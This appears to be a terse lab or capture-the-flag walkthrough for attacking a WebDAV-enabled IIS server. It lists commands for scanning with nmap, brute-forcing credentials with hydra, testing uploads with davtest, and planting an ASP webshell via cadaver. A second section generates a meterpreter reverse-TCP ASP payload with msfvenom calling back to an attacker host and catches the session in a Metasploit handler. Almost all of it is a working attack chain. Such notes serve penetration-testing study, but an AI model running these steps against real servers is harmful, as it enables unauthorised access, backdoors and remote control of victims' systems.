```
Check wheather webDAV has been configured to run on the IIS web server

Bruteforce the credentials for login

Upload a malicious .asp file that can execute arbitary commands or obtain a reverse shell on the target



Tools : Davtest, cadaver
- nmap -sV -sC 10.3.26.115
- nmap -p80 --script http-enum -sV 10.3.26.115
- Browser [http://10.3.26.115/webdav/](http://10.3.26.115/webdav/) - Login check
- hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.26.115 http-get /webdav/
- davtest -url <http://10.3.26.115/webdav>
- davtest -auth bob:password_123321 -url <http://10.3.26.115/webdav`> - Find out which file can be submitted
- cadaver [http://10.3.26.115/webdav](http://10.3.26.115/webdav)
- dav:/webdav/> put /usr/share/webshells/asp/webshell.asp - file upload using cadaver
- Access the backdoor: [http://10.3.26.115/webdav/webshell.asp](http://10.3.26.115/webdav/webshell.asp)
- Now type your command on the box and run , find flag


WebDAV with Metasploit 
 
- nmap -p80 --script http-enum -sV 10.4.18.218 
- davtest -auth bob:password_123321 -url <http://10.4.18.218/webdav>
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.4 LPORT=1234 -f asp > shell.asp
- cadaver <http://10.4.18.218/webdav>
- put /root/shell.asp
- service postgresql start && msfconsole
- use exploit/multi/handler
- set payload windows/meterpreter/reverse_tcp
- set LHOST 10.10.80.4
- set LPORT 1234
- run
    
Browser [http://10.4.18.218/webdav/shell.asp](http://10.4.18.218/webdav/shell.asp)  
Got meterpreter session > sysinfo,getuid

```